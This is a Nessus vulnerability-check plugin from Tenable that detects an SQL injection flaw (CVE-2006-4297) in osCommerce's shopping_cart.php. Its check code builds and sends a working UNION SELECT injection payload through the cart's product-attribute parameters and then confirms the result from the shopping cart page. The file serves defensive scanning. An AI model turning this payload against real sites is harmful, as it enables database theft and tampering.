#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22255);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-4297");
  script_bugtraq_id(19644, 19774);
  script_xref(name:"OSVDB", value:"29508");

  script_name(english:"osCommerce shopping_cart.php id Array Parameters SQL Injection");
  script_summary(english:"Checks for SQL injection flaw in osCommerce");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
  script_set_attribute(attribute:"description", value:
"The version of osCommerce installed on the remote host fails to
properly sanitize input used for product attributes before using it in
a database query in the 'shopping_cart.php' script.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated attacker
may be able to exploit this issue to uncover sensitive information
such as password hashes, modify data, launch attacks against the
underlying database, etc." );
  script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00110-08172006" );
  script_set_attribute(attribute:"see_also", value:"http://forums.oscommerce.com/index.php?showtopic=223556&pid=918371" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to osCommerce 2.2 Milestone 2 Update 060817 or later." );
  script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("oscommerce_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP scripts.");


# Test an install.
install = get_install_from_kb(appname:'oscommerce', port:port);
if (isnull(install)) exit(1, "osCommerce wasn't detected on port "+port+".");
dir = install['dir'];


# Grab the main page.
res = http_get_cache(item:string(dir, "/index.php"), port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");


# Identify a product.
pat = '/product_info\\.php\\?products_id=([^&"]+)';
matches = egrep(pattern:pat, string:res);
id = NULL;

if (matches)
{
  foreach match (split(matches, keep:FALSE))
  {
    id = eregmatch(pattern:pat, string:match);
    if (!isnull(id))
    {
      id = id[1];
      break;
    }
  }
}
if (isnull(id)) exit(1, "Failed to identify a product in the osCommerce install at "+build_url(port:port, qs:dir+"/")+".");


# Inject our exploit into a saved session.
#
# nb: magic1 must appear before any of the other values of 
#     products_options_names after the ORDER BY or the exploit may fail.
magic1 = string("    ", SCRIPT_NAME);
magic2 = string(unixtime());
exploit = string("1' UNION SELECT '", magic1, "',", magic2, ",null,null ORDER BY products_options_name LIMIT 1-- ");
sid = hexstr(MD5(magic2));
postdata = string(
  "id[", id, "][1]=", urlencode(str:exploit), "&",
  "cart_quantity[]=1&",
  "products_id[]=", id, "&",
  "osCsid=", sid
);
req = string(
  "POST ", dir, "/product_info.php?action=update_product HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
  "Content-Type: application/x-www-form-urlencoded\r\n",
  "Content-Length: ", strlen(postdata), "\r\n",
  "\r\n",
  postdata
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# Now try to exploit the flaw.
req = http_get(
  item:string(
    dir, "/shopping_cart.php?",
    "osCsid=", sid
  ), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# There's a problem if we see our magic values where the attributes should be.
if (string("<br><small><i> - ", magic1, " ", magic2, "</i></small>") >< res)
{
  security_hole(port);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  exit(0);
}
